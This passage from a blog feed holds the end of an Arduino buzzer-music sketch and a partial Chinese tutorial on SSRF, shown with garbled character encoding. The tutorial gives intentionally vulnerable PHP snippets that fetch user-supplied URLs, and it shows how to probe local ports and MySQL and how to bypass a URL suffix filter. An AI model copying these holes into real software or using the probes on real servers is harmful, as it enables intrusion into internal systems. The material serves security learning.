class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTC0 -1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTC1 262</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTC2 294</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTC3 330</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTC4 350</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTC5 393</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTC6 441</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTC7 495</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTCL1 131</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTCL2 147</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTCL3 165</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTCL4 175</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTCL5 196</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTCL6 221</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTCL7 248  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTCH1 525</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTCH2 589</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTCH3 661</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTCH4 700</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTCH5 786</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTCH6 882</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTCH7 990</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//åˆ—å‡ºå…¨éƒ¨Cè°ƒçš„é¢‘ç‡</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WHOLE 1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HALF 0.5</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> QUARTER 0.25</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EIGHTH 0.25</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIXTEENTH 0.625</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//åˆ—å‡ºæ‰€æœ‰èŠ‚æ‹</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> tune[]=                 <span class="comment">//æ ¹æ®ç®€è°±åˆ—å‡ºå„é¢‘ç‡</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  NTC5,NTC5,NTC6,</span><br><span class="line"></span><br><span class="line">  NTCH1,NTC6,NTC5,NTC6,NTCH1,NTC6,NTC5,</span><br><span class="line"></span><br><span class="line">  NTC3,NTC3,NTC3,NTC5,</span><br><span class="line"></span><br><span class="line">  NTC6,NTC6,NTC5,NTCH3,NTCH3,NTCH2,NTCH1,</span><br><span class="line"></span><br><span class="line">  NTCH2,NTCH1,NTCH2,</span><br><span class="line"></span><br><span class="line">  NTCH3,NTCH3,NTCH2,NTCH3,NTCH2,NTCH1,NTCH2,NTCH1,NTC6,</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  NTCH2,NTCH2,NTCH2,NTCH1,NTC6,NTC5,</span><br><span class="line"></span><br><span class="line">  NTC6,NTC5,NTC5,NTCH1,NTC6,NTC5,NTC1,NTC3,</span><br><span class="line"></span><br><span class="line">  NTC2,NTC1,NTC2,</span><br><span class="line"></span><br><span class="line">  NTC3,NTC5,NTC5,NTC3,NTCH1,NTC7,</span><br><span class="line"></span><br><span class="line">  NTC6,NTC5,NTC6,NTCH1,NTCH2,NTCH3,</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  NTCH3,NTCH2,NTCH1,NTC5,NTCH1,NTCH2,NTCH3,</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  NTCH2,NTC0,NTCH3,NTCH2,</span><br><span class="line"></span><br><span class="line">  NTCH1,NTC0,NTCH2,NTCH1,NTC6,NTC0,</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  NTCH2,NTC6,NTCH1,NTCH1,NTCH1,NTC6,NTC5,NTC3,</span><br><span class="line"></span><br><span class="line">  NTC5,</span><br><span class="line"></span><br><span class="line">  NTC5,NTC6,NTCH1,NTC7,NTC6,</span><br><span class="line"></span><br><span class="line">  NTCH3,NTCH3,NTCH3,NTCH3,NTCH2,NTCH2,NTCH1,</span><br><span class="line"></span><br><span class="line">  NTC6,NTCH3,NTCH2,NTCH1,NTCH2,NTCH1,NTC6,</span><br><span class="line"></span><br><span class="line">  NTCH1,</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">float</span> durt[]=                   <span class="comment">//æ ¹æ®ç®€è°±åˆ—å‡ºå„èŠ‚æ‹</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="number">0.5</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">1.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>+<span class="number">1</span>+<span class="number">1</span>,<span class="number">0.5</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">1.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">0.5</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>+<span class="number">1</span>+<span class="number">1</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">0.5</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">0.5</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">1</span>+<span class="number">1</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>+<span class="number">1</span>+<span class="number">1</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="number">1.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">1.5</span>,<span class="number">0.5</span>,<span class="number">1</span>,<span class="number">0.5</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">1.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>+<span class="number">1</span>+<span class="number">1</span>,<span class="number">0.5</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>,<span class="number">0.5</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">1</span>,<span class="number">1</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">1</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">0.5</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>+<span class="number">1</span>+<span class="number">1</span>+<span class="number">1</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">1</span>+<span class="number">1</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">1.5</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">1.5</span>,<span class="number">0.5</span>,<span class="number">1</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">1</span>+<span class="number">1</span>+<span class="number">1</span>+<span class="number">1</span>,</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> length;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> tonepin=<span class="number">8</span>;   <span class="comment">//å¾—ç”¨8å·æ¥å£</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setup</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">pinMode</span>(tonepin,<span class="literal">OUTPUT</span>);</span><br><span class="line"></span><br><span class="line">  length=<span class="keyword">sizeof</span>(tune)/<span class="keyword">sizeof</span>(tune[<span class="number">0</span>]);   <span class="comment">//è®¡ç®—é•¿åº¦</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">loop</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> x=<span class="number">0</span>;x&lt;length;x++)</span><br><span class="line"></span><br><span class="line">  &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">tone</span>(tonepin,tune[x]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">delay</span>(<span class="number">500</span>*durt[x]);   <span class="comment">//è¿™é‡Œç”¨æ¥æ ¹æ®èŠ‚æ‹è°ƒèŠ‚å»¶æ—¶ï¼Œ500è¿™ä¸ªæŒ‡æ•°å¯ä»¥è‡ªå·±è°ƒæ•´ï¼Œåœ¨è¯¥éŸ³ä¹ä¸­ï¼Œæˆ‘å‘ç°ç”¨500æ¯”è¾ƒåˆé€‚ã€‚</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">noTone</span>(tonepin);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">5000</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><blockquote><p>ç¾å¦™çš„éŸ³ä¹æ€»æ˜¯é‚£ä¹ˆçŸ­æš‚ï¼Œè¯•å¬ç»“æŸï¼</p></blockquote><h1 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h1><p>[1] <a href="https://blog.csdn.net/u011481047/article/details/53257685">Arduino+èœ‚é¸£å™¨åˆ¶ä½œæœ‰è¶£çš„å°éŸ³ä¹</a></p><p>[2] <a href="https://www.geek-workshop.com/thread-288-1-1.html">Arduinoå­¦ä¹ ç¬”è®°â€”è¶…ç®€å•åˆ¶ä½œéŸ³ä¹</a></p><p>[3] <a href="https://blog.csdn.net/m0_37738838/article/details/95062958?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161742198916780262574621%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=161742198916780262574621&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-13-95062958.pc_search_result_no_baidu_js&utm_term=arduino+%E8%9C%82%E9%B8%A3%E5%99%A8">Arduino èœ‚é¸£å™¨æ’­æ”¾éŸ³ä¹</a></p>]]></content>
      
      
      <categories>
          
          <category> æ‚ä¸ƒæ‚å…« </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Arduino </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRFæ¼æ´å­¦ä¹ </title>
      <link href="posts/18466.html"/>
      <url>posts/18466.html</url>
      
        <content type="html"><![CDATA[<h1 id="SSRFæ¦‚å¿µ"><a href="#SSRFæ¦‚å¿µ" class="headerlink" title="SSRFæ¦‚å¿µ"></a>SSRFæ¦‚å¿µ</h1><p>SSRFï¼ˆServer-Side Request Forgery:æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ï¼‰æ˜¯ä¸€ç§ç”±æ”»å‡»è€…æ„é€ å½¢æˆå¹¶ç”±æœåŠ¡ç«¯å‘èµ·æ¶æ„è¯·æ±‚çš„ä¸€ä¸ªå®‰å…¨æ¼æ´ã€‚æ­£æ˜¯å› ä¸ºæ¶æ„è¯·æ±‚ç”±æœåŠ¡ç«¯å‘èµ·ï¼Œè€ŒæœåŠ¡ç«¯èƒ½å¤Ÿè¯·æ±‚åˆ°ä¸è‡ªèº«ç›¸è¿è€Œä¸å¤–ç½‘éš”ç»çš„å†…éƒ¨ç½‘ç»œç³»ç»Ÿï¼Œæ‰€ä»¥ä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒSSRFçš„æ”»å‡»ç›®æ ‡æ˜¯æ”»å‡»è€…æ— æ³•ç›´æ¥è®¿é—®çš„å†…ç½‘ç³»ç»Ÿã€‚</p><h1 id="SSRFçš„åŸç†"><a href="#SSRFçš„åŸç†" class="headerlink" title="SSRFçš„åŸç†"></a>SSRFçš„åŸç†</h1><p>SSRFæ¼æ´çš„å½¢æˆå¤§å¤šæ˜¯ç”±äºæœåŠ¡ç«¯æä¾›äº†ä»å…¶ä»–æœåŠ¡å™¨åº”ç”¨è·å–æ•°æ®çš„åŠŸèƒ½è€Œæ²¡æœ‰å¯¹ç›®æ ‡åœ°å€åšè¿‡æ»¤å’Œé™åˆ¶ã€‚ä¾‹å¦‚ï¼Œé»‘å®¢æ“ä½œæœåŠ¡ç«¯ä»æŒ‡å®šURLåœ°å€è·å–ç½‘é¡µæ–‡æœ¬å†…å®¹ï¼ŒåŠ è½½æŒ‡å®šåœ°å€çš„å›¾ç‰‡ï¼Œä¸‹è½½ç­‰ï¼Œåˆ©ç”¨çš„å°±æ˜¯æœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ ï¼ŒSSRFæ¼æ´å¯ä»¥åˆ©ç”¨å­˜åœ¨ç¼ºé™·çš„WEBåº”ç”¨ä½œä¸ºä»£ç†æ”»å‡»è¿œç¨‹å’Œæœ¬åœ°çš„æœåŠ¡å™¨ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/640"></p><h1 id="SSRFçš„å±å®³"><a href="#SSRFçš„å±å®³" class="headerlink" title="SSRFçš„å±å®³"></a>SSRFçš„å±å®³</h1><blockquote><ol><li>å¯¹å¤–ç½‘ã€æœåŠ¡å™¨æ‰€åœ¨å†…ç½‘ã€æœåŠ¡å™¨æœ¬åœ°è¿›è¡Œç«¯å£æ‰«æï¼Œè·å–ä¸€äº›æœåŠ¡çš„bannerä¿¡æ¯ç­‰ã€‚</li><li>æ”»å‡»è¿è¡Œåœ¨å†…ç½‘æˆ–æœåŠ¡å™¨æœ¬åœ°çš„å…¶ä»–åº”ç”¨ç¨‹åºï¼Œå¦‚redisã€mysqlç­‰ã€‚</li><li>å¯¹å†…ç½‘Webåº”ç”¨è¿›è¡ŒæŒ‡çº¹è¯†åˆ«ï¼Œè¯†åˆ«ä¼ä¸šå†…éƒ¨çš„èµ„äº§ä¿¡æ¯ã€‚</li><li>æ”»å‡»å†…å¤–ç½‘çš„Webåº”ç”¨ï¼Œä¸»è¦æ˜¯ä½¿ç”¨HTTP GET/POSTè¯·æ±‚å°±å¯ä»¥å®ç°çš„æ”»å‡»ï¼Œå¦‚sqlæ³¨å…¥ã€æ–‡ä»¶ä¸Šä¼ ç­‰ã€‚</li><li>åˆ©ç”¨fileåè®®è¯»å–æœåŠ¡å™¨æœ¬åœ°æ–‡ä»¶ç­‰ã€‚</li><li>è¿›è¡Œè·³æ¿æ”»å‡»ç­‰ã€‚</li></ol></blockquote><h1 id="SSRFæµ‹è¯•ä»£ç "><a href="#SSRFæµ‹è¯•ä»£ç " class="headerlink" title="SSRFæµ‹è¯•ä»£ç "></a>SSRFæµ‹è¯•ä»£ç </h1><p>SSRFæ¼æ´ç›¸å…³å‡½æ•°</p><blockquote><p><em>file_get_contents()</em> å°†æ•´ä¸ªæ–‡ä»¶æˆ–ä¸€ä¸ªurlæ‰€æŒ‡å‘çš„æ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­ã€‚</p><p><em>readfile()</em> è¾“å‡ºä¸€ä¸ªæ–‡ä»¶çš„å†…å®¹ã€‚</p><p><em>fsockopen()</em> æ‰“å¼€ä¸€ä¸ªç½‘ç»œè¿æ¥æˆ–è€…ä¸€ä¸ªUnix å¥—æ¥å­—è¿æ¥ã€‚</p><p>curl_exec() æ‰§è¡Œä¸€ä¸ªcURLä¼šè¯,æˆåŠŸè¿”å›trueï¼Œå¤±è´¥è¿”å›falseã€‚</p><p><em>curl_setopt</em>() å‡½æ•°å°†ä¸ºä¸€ä¸ªCURLä¼šè¯è®¾ç½®é€‰é¡¹ã€‚optionå‚æ•°æ˜¯ä½ æƒ³è¦çš„è®¾ç½®,valueæ˜¯è¿™ä¸ªé€‰é¡¹ç»™å®šçš„å€¼ã€‚</p></blockquote><ol><li><code>file_get_contents()</code>æµ‹è¯•ä»£ç ï¼š</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="variable">$url</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä¸Šè¿°æµ‹è¯•ä»£ç ä¸­ï¼Œ<code>file_get_contents()</code> å‡½æ•°å°†æ•´ä¸ªæ–‡ä»¶æˆ–ä¸€ä¸ªurlæ‰€æŒ‡å‘çš„æ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­ï¼Œå¹¶å±•ç¤ºç»™ç”¨æˆ·ï¼Œæˆ‘ä»¬æ„é€ å¥½paylaodå³å¯è¯»å–æœåŠ¡å™¨æœ¬åœ°çš„ä»»æ„æ–‡ä»¶ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210401184537457.png" alt="image-20210401184537457"></p><p>ä¹Ÿå¯ä»¥è¿›è¡Œè¿œç¨‹è®¿é—®ï¼š</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210401184635097.png" alt="image-20210401184635097"></p><p>readfile()å‡½æ•°ä¸filegetcontents()å‡½æ•°ç›¸ä¼¼ã€‚</p><ol start="2"><li><code>fsockopen() </code>æµ‹è¯•ä»£ç ï¼š</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$host</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$fp</span> = fsockopen(<span class="variable">$host</span>, <span class="number">80</span>, <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">30</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$fp</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$errstr</span> (<span class="subst">$errno</span>)&lt;br /&gt;\n&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$out</span> = <span class="string">&quot;GET / HTTP/1.1\r\n&quot;</span>;</span><br><span class="line">    <span class="variable">$out</span> .= <span class="string">&quot;Host: <span class="subst">$host</span>\r\n&quot;</span>;</span><br><span class="line">    <span class="variable">$out</span> .= <span class="string">&quot;Connection: Close\r\n\r\n&quot;</span>;</span><br><span class="line">    fwrite(<span class="variable">$fp</span>, <span class="variable">$out</span>);</span><br><span class="line">    <span class="keyword">while</span> (!feof(<span class="variable">$fp</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> fgets(<span class="variable">$fp</span>, <span class="number">128</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(<span class="variable">$fp</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>fsockopen($hostname,$port,$errno,$errstr,$timeout)</code> ç”¨äºæ‰“å¼€ä¸€ä¸ªç½‘ç»œè¿æ¥æˆ–è€…ä¸€ä¸ªUnix å¥—æ¥å­—è¿æ¥ï¼Œåˆå§‹åŒ–ä¸€ä¸ªå¥—æ¥å­—è¿æ¥åˆ°æŒ‡å®šä¸»æœºï¼ˆhostnameï¼‰ï¼Œå®ç°å¯¹ç”¨æˆ·æŒ‡å®šurlæ•°æ®çš„è·å–ã€‚è¯¥å‡½æ•°ä¼šä½¿ç”¨socketè·ŸæœåŠ¡å™¨å»ºç«‹tcpè¿æ¥ï¼Œè¿›è¡Œä¼ è¾“åŸå§‹æ•°æ®ã€‚fsockopen()å°†è¿”å›ä¸€ä¸ªæ–‡ä»¶å¥æŸ„ï¼Œä¹‹åå¯ä»¥è¢«å…¶ä»–æ–‡ä»¶ç±»å‡½æ•°è°ƒç”¨ï¼ˆä¾‹å¦‚ï¼šfgets()ï¼Œfgetss()ï¼Œfwrite()ï¼Œfclose()è¿˜æœ‰feof()ï¼‰ã€‚å¦‚æœè°ƒç”¨å¤±è´¥ï¼Œå°†è¿”å›falseã€‚</p><p>æ„é€  <code>ssrf.php?url=www.baidu.com</code> å³å¯æˆåŠŸè§¦å‘ssrfå¹¶è¿”å›ç™¾åº¦ä¸»é¡µï¼š</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210401185335370.png" alt="image-20210401185335370"></p><p>ä½†æ˜¯è¯¥å‡½æ•°çš„SSRFæ— æ³•è¯»å–æœ¬åœ°æ–‡ä»¶ã€‚</p><ol start="3"><li><code>curl_exec() </code> æµ‹è¯•ä»£ç ï¼š</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL ^ E_NOTICE);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$ch</span> = curl_init();<span class="comment">//åˆå§‹åŒ–curlä¼šè¯</span></span><br><span class="line">curl_setopt(<span class="variable">$ch</span>,CURLOPT_URL,<span class="variable">$url</span>);<span class="comment">//æŒ‡å®šè¯·æ±‚çš„url</span></span><br><span class="line">curl_setopt(<span class="variable">$ch</span>,CURLOPT_HEADER,<span class="number">0</span>);<span class="comment">// å¯ç”¨æ—¶ä¼šå°†å¤´æ–‡ä»¶çš„ä¿¡æ¯ä½œä¸ºæ•°æ®æµè¾“å‡ºã€‚å‚æ•°ä¸º1è¡¨ç¤ºè¾“å‡ºä¿¡æ¯å¤´,ä¸º0è¡¨ç¤ºä¸è¾“å‡º</span></span><br><span class="line">curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">curl_close(<span class="variable">$ch</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">curl(<span class="variable">$url</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ­¤é¡µé¢çš„åŠŸèƒ½æ˜¯è·å–URLå‚æ•°ï¼Œç„¶åå°†URLçš„å†…å®¹æ˜¾ç¤ºåˆ°ç½‘é¡µé¡µé¢ä¸Šã€‚</p><p>åˆ©ç”¨ä¸Šé¢ç¼–å†™å¥½çš„SSRFæ¼æ´æ¥æµ‹è¯•ä¸€ä¸‹ï¼š</p><ul><li>æ¢æµ‹ä¸€ä¸‹æœ¬åœ°æ˜¯å¦å­˜åœ¨mysqlæœåŠ¡å™¨</li></ul><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210331214657070.png" alt="image-20210331214657070"></p><p>å‡ºç°mysqlç›¸å…³çš„æç¤ºï¼Œè¯´æ˜è¿™ä¸ªæœåŠ¡å™¨ä¸Šå­˜åœ¨mysqlã€‚</p><blockquote><p>Tipsï¼šå¦‚æœå¯¹urlåç¼€æœ‰é™åˆ¶åˆ™å¯ä»¥ç”¨<code>?</code>æˆ–è€…<code>#</code>ç»•è¿‡ï¼Œå¦‚<code>http://localhost/ssrf/ssrf.php?url=127.0.0.1:3306/?.jpg</code></p></blockquote><ul><li>ä¼ªé€ è¯·æ±‚è®¿é—®ç™¾åº¦(ç”¨æœåŠ¡å™¨åšè·³æ¿è®¿é—®åˆ«çš„ç½‘ç«™)</li></ul><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210331215034000.png" alt="image-20210331215034000"></p><ul><li>ä¼ªé€ è¯·æ±‚æ¢æµ‹æœåŠ¡å™¨å¼€æ”¾çš„ç«¯å£</li></ul><p>å’Œç¬¬ä¸€ç‚¹ç›¸åŒï¼Œæ›´æ”¹ä¸åŒçš„ç«¯å£å·è¿›è¡Œéå†æ¥åˆ¤æ–­ç«¯å£æ˜¯å¦å¼€æ”¾ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210331215235270.png" alt="image-20210331215235270"></p><ul><li>ä¼ªé€ è¯·æ±‚è¯»å–æœåŠ¡å™¨(å†…ç½‘)æ•æ„Ÿèµ„æ–™</li></ul><p><img 